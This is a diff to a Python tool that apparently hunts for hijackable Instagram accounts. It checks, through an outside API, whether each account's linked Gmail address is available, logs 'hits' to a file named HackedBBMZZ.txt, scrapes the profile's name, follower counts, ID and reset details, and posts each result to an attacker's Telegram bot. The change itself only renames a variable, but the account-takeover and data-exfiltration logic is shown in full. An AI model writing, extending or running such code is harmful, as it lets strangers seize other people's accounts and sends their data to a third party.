@@ -181,18 +181,18 @@ class Gmail:
                             
                         
                         elif ('"user":true,') in self.rf:
-                            self.req = requests.get(f'https://api-check-cc49f9ebb784.herokuapp.com/qredes/gmail/?email={self.email}@gmail.com').text
+                            self.req = requests.get(f'https://api-check-cc49f9ebb784.herokuapp.com/qredes/gmail/?email={self.rr}@gmail.com').text
                         
                             if ('"status":"good"') in self.req:
                                 with open('HackedBBMZZ.txt','a') as f8:
-                                        f8.write(f'{self.email}\n')
+                                        f8.write(f'{self.rr}\n')
                             
                                 #os.system('cls' if os.name =='nt'else'clear')
                                 self.ok +=1
                         
                                 #print('{}3{}mHit : {} - Bad Instagram : {} - Bad Gmail : {}'.format(self.clor,self.red,self.ok,self.bad,self.bad1))
                                 
-                                self.url1 ='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.email)
+                                self.url1 ='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.rr)
                                 self.head1 = {
                                     'accept': '*/*',
                                     'accept-encoding': 'gzip, deflate, br',
@@ -267,12 +267,12 @@ class Gmail:
                                             
                     
                                             try:
-                                                lm = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {self.email}\n𝙴𝙼𝙰𝙸𝙻⛧ : {self.email}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : {rs}\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
+                                                lm = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {self.rr}\n𝙴𝙼𝙰𝙸𝙻⛧ : {self.rr}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : {rs}\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
                                                 tlg =(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.ido}&text={lm}')
                                                 ru= requests.post(tlg)
                                                 
                                             except UnboundLocalError as error:
-                                                lm1 = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {self.email}\n𝙴𝙼𝙰𝙸𝙻⛧ : {self.email}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : Error\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
+                                                lm1 = f'𝙷𝙸𝚃𖥢 : {self.j}\n𝙽𝙰𝙼𝙴🜑 : {nam}\n𝙺𝚂𝙴𝙽𝙰𝙼𝙴🜾 : {self.rr}\n𝙴𝙼𝙰𝙸𝙻⛧ : {self.rr}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶❛ : {fol}\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂🜝 : {fols}\n𝙸𝙳🜝 : {id}\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃𖥆 : {da}\n𝚁𝙴𝚂𝚃 𖠬 : Error\n𝚃𝙸𝙼𝙴 𝙽𝙴𝚆𖤺 : {self.day}\n𝙿𝚈ꫝ : @BBMZZ'
                                                 tlg =(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.ido}&text={lm1}')
                                                 ru= requests.post(tlg)
                                         except requests.exceptions.ReadTimeout as erp:
